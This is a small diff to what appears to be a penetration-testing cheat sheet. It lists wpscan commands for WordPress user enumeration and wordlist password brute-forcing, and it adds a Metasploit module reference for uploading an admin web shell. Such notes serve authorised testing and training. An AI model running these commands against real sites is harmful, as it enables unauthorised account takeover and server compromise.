@@ -139,6 +139,7 @@ wpscan --url http://... --enumerate u --log
 wpscan --url http://<targetip> --wordlist wordlist.txt --username example_username
 http://....../wp-admin
 http://...../wp-content/uploads/2017/10/file.png
+msfconsole : exploit/unix/webapp/wp_admin_shell_upload
 
 ----------------------------------------------
 #Windows Command Execution (RFI exploit)
